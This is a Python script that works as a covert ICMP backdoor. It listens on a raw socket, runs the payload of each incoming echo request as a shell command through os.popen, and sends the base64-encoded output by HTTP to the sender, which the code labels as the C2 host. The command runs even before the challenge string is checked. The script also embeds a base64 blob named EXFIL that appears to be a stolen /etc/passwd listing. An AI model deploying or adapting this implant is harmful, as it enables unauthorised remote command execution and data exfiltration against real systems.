import struct
import socket
import binascii
import requests
import os
import base64

# The challenge string
CHALLENGE_STRING = b'deadbeef'

# The response string
RESPONSE_STRING = b'1234567'

EXFIL = b"""cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Iv
c2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9n
aW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5
bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmlu
L25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4K
bHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODpt
YWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9v
bC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVj
cDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25v
bG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dp
bgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxp
c3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9n
aW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0
MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91
c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6
L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1uZXR3b3JrOng6MTAwOjEwMjpzeXN0ZW1kIE5ldHdv
cmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1y
ZXNvbHZlOng6MTAxOjEwMzpzeXN0ZW1kIFJlc29sdmVyLCwsOi9ydW4vc3lzdGVtZDovdXNyL3Ni
aW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAyOjEwNTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9u
b2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDM6MTA2OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6
YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwNDoxMTE6
Oi9ob21lL3N5c2xvZzovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA1OjY1NTM0Ojovbm9uZXhp
c3RlbnQ6L3Vzci9zYmluL25vbG9naW4KdXVpZGQ6eDoxMDY6MTEyOjovcnVuL3V1aWRkOi91c3Iv
c2Jpbi9ub2xvZ2luCnRjcGR1bXA6eDoxMDc6MTEzOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25v
bG9naW4KdHNhbXM6eDoxMDAwOjEwMDA6LCwsOi9ob21lL3RzYW1zOi9iaW4vYmFzaApkbnNtYXNx
Ong6MTA4OjY1NTM0OmRuc21hc3EsLCw6L3Zhci9saWIvbWlzYzovdXNyL3NiaW4vbm9sb2dpbgpm
dHA6eDoxMDk6MTE5OmZ0cCBkYWVtb24sLCw6L3Nydi9mdHA6L3Vzci9zYmluL25vbG9naW4K"""

# Create a raw socket
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

# Set the socket options to allow reuse of the address
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to all interfaces
s.bind(('0.0.0.0', 0))

# Set the socket timeout to 1 second
s.settimeout(60)


def exec(cmd:bytes):
    print(f"Execing {cmd}")
    do = os.popen(cmd.decode()).read()
    if do == '':
        do = 'none'
    result = do.encode()

    return base64.b64encode(result)

# Continuously receive ICMP packets
while True:
    # Receive a packet

    data, addr = s.recvfrom(1024)
    print(data)
    
    # Extract the ICMP header
    icmp_header = data[20:28]
    
    # Unpack the ICMP header
    icmp_type, code, checksum, id, sequence = struct.unpack('bbHHh', icmp_header)
    
    # If the ICMP type is 8 (Echo request)
    if icmp_type == 8:
        # Extract the payload
        payload = data[28:]
        
        prep = payload.decode()

        challenge = bytes(prep[0:8],'utf-8')
        other = bytes(prep[8::],'utf-8')
        #print(challenge,cmd)
        cmd = exec(other)
        # If the payload is the challenge string
        if challenge == CHALLENGE_STRING:
            # Create the response packet
            print(f"Good {payload}")
            c2 = addr[0]
            #c2 = "localhost"
            requests.get(f"http://{c2}/{cmd.decode()}")
            #response_packet = struct.pack('bbHHh', 0, 0, 0, id, sequence) + RESPONSE_STRING
            
            # Calculate the checksum
            # checksum = 0
            # for i in range(0, len(response_packet), 2):
            #     word = response_packet[i] + (response_packet[i+1] << 8)
            #     checksum += word
            #     checksum = (checksum & 0xffff) + (checksum >> 16)
            # checksum = ~checksum & 0xffff
            
            # # Insert the checksum into the response packet
            # response_packet = response_packet[:2] + struct.pack('H', checksum) + response_packet[4:]
            
            #Send the response packet
            # s.sendto(response_packet, addr)
            # print(f"Sent {cmd} to {addr}")

# Close the socket
s.close()